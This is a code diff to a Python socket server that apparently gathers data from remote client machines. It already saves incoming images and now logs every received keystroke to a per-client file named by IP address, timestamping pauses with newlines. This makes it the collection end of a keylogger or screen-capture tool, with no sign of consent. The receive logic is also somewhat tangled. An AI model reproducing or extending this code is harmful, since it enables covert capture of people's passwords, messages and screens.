@@ -2,6 +2,9 @@ import socket
 import threading
 import queue
 import os
+import time
+import select
+
 
 SERVER_HOST = "0.0.0.0"
 SERVER_PORT = 4000
@@ -14,9 +17,17 @@ keypress_queues = {}
 
 
 # Function to handle client messages, including image data
-def handle_client(client_socket, client_address):
+def handle_client(client_socket, client_address, keypress_queue):
     client_ip = client_address[0]
     print(f"Connection from {client_ip} established!")
+
+    client_address = client_socket.getpeername()[0]
+    file_name = f"{client_address}.txt"
+    newline_added = False  # Flag to track if a newline has been added
+    last_keypress_time = time.time()  # Track the time of the last keypress
+
+    client_socket.settimeout(0.5)  # Set a timeout for the socket (non-blocking)
+
 
     while True:
         try:
@@ -45,7 +56,28 @@ def handle_client(client_socket, client_address):
                 print(f"Image received and saved as {image_filename}")
                 client_socket.send("Image received".encode())  # Notify client
             else:
-                print(f"Received message from {client_ip}: {data}")
+                with open(file_name, 'a') as file:
+                        # Check if 5 seconds have passed since the last keypress
+                        if time.time() - last_keypress_time >= 5:
+                            if not newline_added:
+                                keypress_queue.put('\n')
+                                file.write('\n')
+                                file.flush()  # Make sure the newline is written immediately
+                                newline_added = True
+
+                        # Use select to check if data is available to read
+                        readable, _, _ = select.select([client_socket], [], [], 0)
+                        if readable:
+                            keypress = client_socket.recv(BUFFER_SIZE).decode()
+                            if not keypress:  # If no keypress (client disconnected)
+                                break
+
+                            keypress_queue.put(keypress)
+                            file.write(keypress)
+                            file.flush()  # Make sure to write immediately
+                            newline_added = False  # Reset the flag when something is written
+                            last_keypress_time = time.time()  # Update the last keypress time
+                        print(f"Received message from {client_ip}: {data}")
         except Exception as e:
             print(f"Error handling client {client_ip}: {e}")
             break
@@ -66,9 +98,11 @@ def start_server(update_clients_list):
         client_socket, client_address = s.accept()
         clients.append(client_address)
         client_sockets[client_address] = client_socket
+        keypress_queue = queue.Queue()
+        keypress_queues[client_address] = keypress_queue
         update_clients_list(clients)
         print(f"{client_address[0]}:{client_address[1]} Connected!")
-        threading.Thread(target=handle_client, args=(client_socket, client_address)).start()
+        threading.Thread(target=handle_client, args=(client_socket, client_address, keypress_queue)).start()
 
 
 # Function to stop the server and close all client connections
